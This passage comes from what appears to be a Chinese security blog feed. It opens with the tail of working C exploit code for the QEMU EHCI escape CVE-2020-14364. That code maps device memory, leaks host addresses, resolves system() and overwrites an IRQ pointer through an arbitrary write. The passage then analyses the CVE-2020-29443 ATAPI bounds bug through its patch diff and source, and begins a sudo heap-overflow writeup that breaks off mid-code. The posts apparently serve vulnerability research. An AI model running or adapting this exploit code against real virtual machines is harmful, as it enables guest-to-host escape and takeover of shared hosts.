class="number">0</span>);</span><br><span class="line">mmio_write(<span class="number">0x34</span>,virt2phys(mm_dma));</span><br><span class="line">mmio_write(<span class="number">0x38</span>,virt2phys(mm_dma));</span><br><span class="line">mmio_write(<span class="number">0x2c</span>,<span class="number">0x4</span>);</span><br><span class="line">mmio_write(<span class="number">0x20</span>,<span class="number">0x11</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> mmio_fd = open(<span class="string">"/sys/devices/pci0000:00/0000:00:04.0/resource0"</span>,O_RDWR|O_SYNC);</span><br><span class="line"><span class="keyword">if</span>(mmio_fd==<span class="number">-1</span>)&#123;</span><br><span class="line">dbg_printf(<span class="string">"ehci mmem open error\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">mmio_mem = mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_WRITE|PROT_READ,MAP_SHARED,mmio_fd,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(mmio_mem==MAP_FAILED)&#123;</span><br><span class="line">dbg_printf(<span class="string">"mmap mmio_mem error\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">mm_dma = mmap(<span class="number">0</span>,<span class="number">0x5000</span>,PROT_WRITE|PROT_READ,MAP_SHARED|MAP_ANONYMOUS,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">mlock(mm_dma,<span class="number">0x5000</span>);</span><br><span class="line"><span class="keyword">if</span>(iopl(<span class="number">3</span>)!=<span class="number">0</span>)&#123;</span><br><span class="line"></span><br><span class="line">dbg_printf(<span class="string">"permission is not enough\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">qh = mm_dma+<span class="number">0x100</span>;</span><br><span class="line">qtd = mm_dma+<span class="number">0x200</span>;</span><br><span class="line">setup_buf = mm_dma+<span class="number">0x300</span>;</span><br><span class="line">setup_buf1 = mm_dma+<span class="number">0x1000</span>;</span><br><span class="line">qh-&gt;current_qtd=virt2phys(mm_dma+<span class="number">0x200</span>);</span><br><span class="line">qh-&gt;epchar=<span class="number">0</span>;</span><br><span class="line">qh-&gt;next=virt2phys(mm_dma+<span class="number">0x100</span>)+<span class="number">0x2</span>;</span><br><span class="line">qh-&gt;token=<span class="number">1</span>&lt;&lt;<span class="number">7</span>;</span><br><span class="line">qtd-&gt;token=<span class="number">1</span>&lt;&lt;<span class="number">7</span>|<span class="number">2</span>&lt;&lt;<span class="number">8</span>|<span class="number">8</span>&lt;&lt;<span class="number">16</span>|<span class="number">1</span>&lt;&lt;<span class="number">6</span>;</span><br><span class="line">qtd-&gt;bufptr[<span class="number">0</span>]=virt2phys(mm_dma+<span class="number">0x300</span>);</span><br><span class="line">dma_buf32=mm_dma+<span class="number">4</span>;</span><br><span class="line">dma_buf32[<span class="number">0</span>]=virt2phys(mm_dma+<span class="number">0x100</span>)+<span class="number">0x2</span>;</span><br><span class="line">setup_buf[<span class="number">0</span>]=<span class="number">0x80</span>;</span><br><span class="line">setup_buf[<span class="number">6</span>]=<span class="number">0xff</span>;</span><br><span class="line">setup_buf[<span class="number">7</span>]=<span class="number">0x0</span>;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"game start"</span>);</span><br><span class="line">sleep(<span class="number">3</span>);</span><br><span class="line">mmio_write(<span class="number">0x64</span>,<span class="number">0x100</span>);<span class="comment">//reset port;</span></span><br><span class="line">mmio_write(<span class="number">0x64</span>,<span class="number">0x4</span>);<span class="comment">//enable port;</span></span><br><span class="line">mmio_write(<span class="number">0x28</span>,<span class="number">0</span>);</span><br><span class="line">mmio_write(<span class="number">0x30</span>,<span class="number">0</span>);</span><br><span class="line">mmio_write(<span class="number">0x34</span>,virt2phys(mm_dma));</span><br><span class="line">mmio_write(<span class="number">0x2c</span>,<span class="number">0x4</span>);</span><br><span class="line">*((<span class="keyword">uint32_t</span>*)(mmio_mem+<span class="number">0x20</span>))=<span class="number">0x11</span>;</span><br><span class="line">sleep(<span class="number">3</span>);</span><br><span class="line">setlength(<span class="number">0x2000</span>,<span class="number">0x80</span>);</span><br><span class="line">sleep(<span class="number">3</span>);</span><br><span class="line">do_copy_read();</span><br><span class="line">sleep(<span class="number">3</span>);</span><br><span class="line"><span class="comment">//hexdump("leak",mm_dma+0x1000,0x1f00);</span></span><br><span class="line"></span><br><span class="line">     tmp=mm_dma+<span class="number">0x1c14</span>+<span class="number">0x1000</span>;</span><br><span class="line">    tmp1 = mm_dma+<span class="number">0x4</span>+<span class="number">0x2000</span>+<span class="number">0x20</span>;</span><br><span class="line">     dev_addr = *tmp1;</span><br><span class="line">     data_buf = dev_addr+<span class="number">0xec</span>;</span><br><span class="line">     port = dev_addr+<span class="number">0x88</span>;</span><br><span class="line">    leak_addr = *tmp;</span><br><span class="line">     irq_addr = dev_addr<span class="number">-0x810</span>;</span><br><span class="line">     ehci_addr = dev_addr<span class="number">-0x87190</span>;</span><br><span class="line">     irq_point = ehci_addr +<span class="number">0xc8</span>;</span><br><span class="line">    <span class="keyword">if</span>(leak_addr == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"INIT DOWN,DO IT AGAIN\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    leak_addr = leak_addr <span class="number">-0x54fc3a</span>;</span><br><span class="line">    system_addr = leak_addr+<span class="number">0x2D5720</span>; </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] base       :%p\n"</span>,leak_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] data_buf   :%p\n"</span>,data_buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] port_addr  :%p\n"</span>,port);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] dev_addr   :%p\n"</span>,dev_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] irq_point  :%p\n"</span>,irq_point);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] ehci_addr  :%p\n"</span>,ehci_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] irq_addr   :%p\n"</span>,irq_addr);</span><br><span class="line"></span><br><span class="line">    arb_write(irq_point,data_buf+<span class="number">0x44</span>);</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    arb_write(irq_point,irq_addr);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hexdump</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *desc, <span class="keyword">void</span> *addr, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> buff[<span class="number">17</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *pc = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)addr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Output description if given.</span></span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s:\n"</span>, desc);</span><br><span class="line">    <span class="keyword">if</span> (len == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"  ZERO LENGTH\n"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (len &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"  NEGATIVE LENGTH: %i\n"</span>, len);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Process every byte in the data.</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="comment">// Multiple of 16 means new line (with line offset).</span></span><br><span class="line">        <span class="keyword">if</span> ((i % <span class="number">16</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// Just don't print ASCII for the zeroth line.</span></span><br><span class="line">            <span class="keyword">if</span> (i != <span class="number">0</span>)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"  %s\n"</span>, buff);</span><br><span class="line">            <span class="comment">// Output the offset.</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"  %04x "</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Now the hex code for the specific character.</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">" %02x"</span>, pc[i]);</span><br><span class="line">        <span class="comment">// And store a printable ASCII character for later.</span></span><br><span class="line">        <span class="keyword">if</span> ((pc[i] &lt; <span class="number">0x20</span>) || (pc[i] &gt; <span class="number">0x7e</span>))</span><br><span class="line">            buff[i % <span class="number">16</span>] = <span class="string">'.'</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            buff[i % <span class="number">16</span>] = pc[i];</span><br><span class="line">        buff[(i % <span class="number">16</span>) + <span class="number">1</span>] = <span class="string">'\0'</span>;</span><br><span class="line"><span class="keyword">if</span>((i+<span class="number">1</span>)%<span class="number">0x100</span>==<span class="number">0</span>&amp;&amp;i!=<span class="number">1</span>)getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Pad out last line if not exactly 16 characters.</span></span><br><span class="line">    <span class="keyword">while</span> ((i % <span class="number">16</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"   "</span>);</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// And print the final ASCII bit.</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"  %s\n"</span>, buff);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考文章：<br><a href="https://xz.aliyun.com/t/8320?spm=5176.12901015.0.i12901015.a65c525ciFuJsq#toc-6" target="_blank" rel="noopener">CVE-2020-14364-Qemu逃逸漏洞分析及两种利用思路</a></p><p><a href="https://www.anquanke.com/post/id/215426#h2-0" target="_blank" rel="noopener">QEMU CVE-2020-14364 漏洞分析（含 PoC 演示）</a></p><p><a href="https://www.anquanke.com/post/id/227283#h2-7" target="_blank" rel="noopener">CVE-2020-14364漏洞复现——Qemu逃逸漏洞</a></p>]]></content>
    
    <summary type="html">
    
      &lt;center&gt;&lt;font size=&quot;5&quot;&gt;info&lt;/font&gt;&lt;/center&gt;
    
    </summary>
    
    
      <category term="cve" scheme="https://leave-Devour.github.io/categories/cve/"/>
    
    
      <category term="qemu" scheme="https://leave-Devour.github.io/tags/qemu/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-29443_分析</title>
    <link href="https://leave-devour.github.io/2021/02/22/CVE-2020-29443-%E5%88%86%E6%9E%90/"/>
    <id>https://leave-devour.github.io/2021/02/22/CVE-2020-29443-%E5%88%86%E6%9E%90/</id>
    <published>2021-02-22T14:41:49.000Z</published>
    <updated>2021-02-23T16:26:23.692Z</updated>
    
    <content type="html"><![CDATA[<center><font size="5">info</font></center><a id="more"></a><p>首先看下diff</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/hw/ide/atapi.c b/hw/ide/atapi.c</span><br><span class="line">index e79157863f..b626199e3d 100644</span><br><span class="line"><span class="comment">--- a/hw/ide/atapi.c</span></span><br><span class="line"><span class="comment">+++ b/hw/ide/atapi.c</span></span><br><span class="line">@@ -322,6 +322,8 @@ static void ide_atapi_cmd_reply(IDEState *s, int size, int </span><br><span class="line">max_size)</span><br><span class="line"> static void ide_atapi_cmd_read_pio(IDEState *s, int lba, int nb_sectors,</span><br><span class="line">                                    int sector_size)</span><br><span class="line"> &#123;</span><br><span class="line"><span class="addition">+    assert(0 &lt;= lba &amp;&amp; lba &lt; (s-&gt;nb_sectors &gt;&gt; 2));</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line">     s-&gt;lba = lba;</span><br><span class="line">     s-&gt;packet_transfer_size = nb_sectors * sector_size;</span><br><span class="line">     s-&gt;elementary_transfer_size = 0;</span><br><span class="line">@@ -420,6 +422,8 @@ eot:</span><br><span class="line"> static void ide_atapi_cmd_read_dma(IDEState *s, int lba, int nb_sectors,</span><br><span class="line">                                    int sector_size)</span><br><span class="line"> &#123;</span><br><span class="line"><span class="addition">+    assert(0 &lt;= lba &amp;&amp; lba &lt; (s-&gt;nb_sectors &gt;&gt; 2));</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line">     s-&gt;lba = lba;</span><br><span class="line">     s-&gt;packet_transfer_size = nb_sectors * sector_size;</span><br><span class="line">     s-&gt;io_buffer_size = 0;</span><br><span class="line">@@ -973,35 +977,49 @@ static void cmd_prevent_allow_medium_removal(IDEState *s, </span><br><span class="line">uint8_t* buf)</span><br><span class="line"></span><br><span class="line"> static void cmd_read(IDEState *s, uint8_t* buf)</span><br><span class="line"> &#123;</span><br><span class="line"><span class="deletion">-    int nb_sectors, lba;</span></span><br><span class="line"><span class="addition">+    unsigned int nb_sectors, lba;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+    /* Total logical sectors of ATAPI_SECTOR_SIZE(=2048) bytes */</span></span><br><span class="line"><span class="addition">+    uint64_t total_sectors = s-&gt;nb_sectors &gt;&gt; 2;</span></span><br><span class="line"></span><br><span class="line">     if (buf[0] == GPCMD_READ_10) &#123;</span><br><span class="line">         nb_sectors = lduw_be_p(buf + 7);</span><br><span class="line">     &#125; else &#123;</span><br><span class="line">         nb_sectors = ldl_be_p(buf + 6);</span><br><span class="line">     &#125;</span><br><span class="line"><span class="deletion">-</span></span><br><span class="line"><span class="deletion">-    lba = ldl_be_p(buf + 2);</span></span><br><span class="line">     if (nb_sectors == 0) &#123;</span><br><span class="line">         ide_atapi_cmd_ok(s);</span><br><span class="line">         return;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line"><span class="addition">+    lba = ldl_be_p(buf + 2);</span></span><br><span class="line"><span class="addition">+    if (lba &gt;= total_sectors || lba + nb_sectors - 1 &gt;= total_sectors) &#123;</span></span><br><span class="line"><span class="addition">+        ide_atapi_cmd_error(s, ILLEGAL_REQUEST, ASC_LOGICAL_BLOCK_OOR);</span></span><br><span class="line"><span class="addition">+        return;</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line">     ide_atapi_cmd_read(s, lba, nb_sectors, 2048);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> static void cmd_read_cd(IDEState *s, uint8_t* buf)</span><br><span class="line"> &#123;</span><br><span class="line"><span class="deletion">-    int nb_sectors, lba, transfer_request;</span></span><br><span class="line"><span class="addition">+    unsigned int nb_sectors, lba, transfer_request;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+    /* Total logical sectors of ATAPI_SECTOR_SIZE(=2048) bytes */</span></span><br><span class="line"><span class="addition">+    uint64_t total_sectors = s-&gt;nb_sectors &gt;&gt; 2;</span></span><br><span class="line"></span><br><span class="line">     nb_sectors = (buf[6] &lt;&lt; 16) | (buf[7] &lt;&lt; 8) | buf[8];</span><br><span class="line"><span class="deletion">-    lba = ldl_be_p(buf + 2);</span></span><br><span class="line"><span class="deletion">-</span></span><br><span class="line">     if (nb_sectors == 0) &#123;</span><br><span class="line">         ide_atapi_cmd_ok(s);</span><br><span class="line">         return;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line"><span class="addition">+    lba = ldl_be_p(buf + 2);</span></span><br><span class="line"><span class="addition">+    if (lba &gt;= total_sectors || lba + nb_sectors - 1 &gt;= total_sectors) &#123;</span></span><br><span class="line"><span class="addition">+        ide_atapi_cmd_error(s, ILLEGAL_REQUEST, ASC_LOGICAL_BLOCK_OOR);</span></span><br><span class="line"><span class="addition">+        return;</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line">     transfer_request = buf[9] &amp; 0xf8;</span><br><span class="line">     if (transfer_request == 0x00) &#123;</span><br><span class="line">         /* nothing */</span><br></pre></td></tr></table></figure><p>上面diff patch的就是 lba这个变量，可以看出是它的问题，而导致了漏洞的产生</p><p>还有 total_sectors 和 nb_sectors 这个两个是 决定 packet_transfer_size的</p><p>还有这里说到的</p><p><a href="https://git.qemu.org/?p=qemu.git;a=commit;h=813212288970c39b1800f63e83ac6e96588095c6" target="_blank" rel="noopener">https://git.qemu.org/?p=qemu.git;a=commit;h=813212288970c39b1800f63e83ac6e96588095c6</a></p><p>上面说到 当s-&gt;lba==-1的时候，在进入到 <strong>ide_atapi_cmd_reply_end</strong> 这个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ide_atapi_cmd_reply_end</span><span class="params">(IDEState *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> byte_count_limit, size, ret;</span><br><span class="line">    <span class="keyword">while</span> (s-&gt;packet_transfer_size &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        trace_ide_atapi_cmd_reply_end(s, s-&gt;packet_transfer_size,</span><br><span class="line">                                      s-&gt;elementary_transfer_size,</span><br><span class="line">                                      s-&gt;io_buffer_index);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* see if a new sector must be read */</span></span><br><span class="line">        <span class="keyword">if</span> (s-&gt;lba != <span class="number">-1</span> &amp;&amp; s-&gt;io_buffer_index &gt;= s-&gt;cd_sector_size) &#123; <span class="comment">//[1]</span></span><br><span class="line">            <span class="keyword">if</span> (!s-&gt;elementary_transfer_size) &#123;</span><br><span class="line">                ret = cd_read_sector(s);</span><br><span class="line">                <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    ide_atapi_io_error(s, ret);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">/* rebuffering within an elementary transfer is</span></span><br><span class="line"><span class="comment">                 * only possible with a sync request because we</span></span><br><span class="line"><span class="comment">                 * end up with a race condition otherwise */</span></span><br><span class="line">                ret = cd_read_sector_sync(s);</span><br><span class="line">                <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    ide_atapi_io_error(s, ret);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (s-&gt;elementary_transfer_size &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">/* there are some data left to transmit in this elementary</span></span><br><span class="line"><span class="comment">               transfer */</span></span><br><span class="line">            size = s-&gt;cd_sector_size - s-&gt;io_buffer_index;</span><br><span class="line">            <span class="keyword">if</span> (size &gt; s-&gt;elementary_transfer_size)</span><br><span class="line">                size = s-&gt;elementary_transfer_size;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="comment">//[2]</span></span><br><span class="line">            <span class="comment">/* a new transfer is needed */</span></span><br><span class="line">            s-&gt;nsector = (s-&gt;nsector &amp; ~<span class="number">7</span>) | ATAPI_INT_REASON_IO;</span><br><span class="line">            ide_set_irq(s-&gt;bus);</span><br><span class="line">            byte_count_limit = atapi_byte_count_limit(s);</span><br><span class="line">            trace_ide_atapi_cmd_reply_end_bcl(s, byte_count_limit);</span><br><span class="line">            size = s-&gt;packet_transfer_size;</span><br><span class="line">            <span class="keyword">if</span> (size &gt; byte_count_limit) &#123;</span><br><span class="line">                <span class="comment">/* byte count limit must be even if this case */</span></span><br><span class="line">                <span class="keyword">if</span> (byte_count_limit &amp; <span class="number">1</span>)</span><br><span class="line">                    byte_count_limit--;</span><br><span class="line">                size = byte_count_limit;</span><br><span class="line">            &#125;</span><br><span class="line">            s-&gt;lcyl = size;</span><br><span class="line">            s-&gt;hcyl = size &gt;&gt; <span class="number">8</span>;</span><br><span class="line">            s-&gt;elementary_transfer_size = size;</span><br><span class="line">            <span class="comment">/* we cannot transmit more than one sector at a time */</span></span><br><span class="line">            <span class="keyword">if</span> (s-&gt;lba != <span class="number">-1</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (size &gt; (s-&gt;cd_sector_size - s-&gt;io_buffer_index))</span><br><span class="line">                    size = (s-&gt;cd_sector_size - s-&gt;io_buffer_index);</span><br><span class="line">            &#125;</span><br><span class="line">            trace_ide_atapi_cmd_reply_end_new(s, s-&gt;status);</span><br><span class="line">        &#125;</span><br><span class="line">        s-&gt;packet_transfer_size -= size;</span><br><span class="line">        s-&gt;elementary_transfer_size -= size;</span><br><span class="line">        s-&gt;io_buffer_index += size;</span><br><span class="line">        assert(size &lt;= s-&gt;io_buffer_total_len);</span><br><span class="line">        assert(s-&gt;io_buffer_index &lt;= s-&gt;io_buffer_total_len);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Some adapters process PIO data right away.  In that case, we need</span></span><br><span class="line"><span class="comment">         * to avoid mutual recursion between ide_transfer_start</span></span><br><span class="line"><span class="comment">         * and ide_atapi_cmd_reply_end.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (!ide_transfer_start_norecurse(s,</span><br><span class="line">                                          s-&gt;io_buffer + s-&gt;io_buffer_index - size,</span><br><span class="line">                                          size, ide_atapi_cmd_reply_end)) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* end of transfer */</span></span><br><span class="line">    trace_ide_atapi_cmd_reply_end_eot(s, s-&gt;status);</span><br><span class="line">    ide_atapi_cmd_ok(s);</span><br><span class="line">    ide_set_irq(s-&gt;bus);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://github.com/leave-Devour/leave-devour.github.io/blob/master/images/image-20210222223727517.png" alt="image-20210222223727517"></p><p>这里会出现 </p><p>packet_transfer_size &gt;  io_buffer_total_len 的情况</p><p>然后  assert(s-&gt;io_buffer_index &lt;= s-&gt;io_buffer_total_len); 这个assert就会报错，qemu就是退出</p><p>因为 packet_transfer_size 是我们可以控制的，而由于 s.lba为-1 缺少了避过很多检测</p><p>参考链接</p><p><a href="https://git.qemu.org/?p=qemu.git;a=commit;h=813212288970c39b1800f63e83ac6e96588095c6" target="_blank" rel="noopener">1</a></p><p><a href="https://lists.gnu.org/archive/html/qemu-devel/2021-01/msg04255.html" target="_blank" rel="noopener">2</a></p><p><a href="https://seclists.org/oss-sec/2021/q1/47" target="_blank" rel="noopener">3</a></p><p><a href="https://patchew.org/QEMU/20201118142745.112579-1-ppandit@redhat.com/" target="_blank" rel="noopener">4</a></p>]]></content>
    
    <summary type="html">
    
      &lt;center&gt;&lt;font size=&quot;5&quot;&gt;info&lt;/font&gt;&lt;/center&gt;
    
    </summary>
    
    
      <category term="cve" scheme="https://leave-Devour.github.io/categories/cve/"/>
    
    
      <category term="qemu" scheme="https://leave-Devour.github.io/tags/qemu/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-3165_第三种方法</title>
    <link href="https://leave-devour.github.io/2021/02/21/CVE-2021-3165-%E7%AC%AC%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95/"/>
    <id>https://leave-devour.github.io/2021/02/21/CVE-2021-3165-%E7%AC%AC%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95/</id>
    <published>2021-02-21T02:38:54.000Z</published>
    <updated>2021-02-23T12:23:21.985Z</updated>
    
    <content type="html"><![CDATA[<center><font size="5">info</font></center><a id="more"></a><p>这个方法是 覆盖了 def_timestampdir这个结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define def_timestampdir        (sudo_defs_table[I_TIMESTAMPDIR].sd_un.str)</span><br></pre></td></tr></table></figure><p>然后我就通过 引用来看是在哪里引用了，然后我发现</p><p>是在这个 函数 check_user</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">check_user(<span class="keyword">int</span> 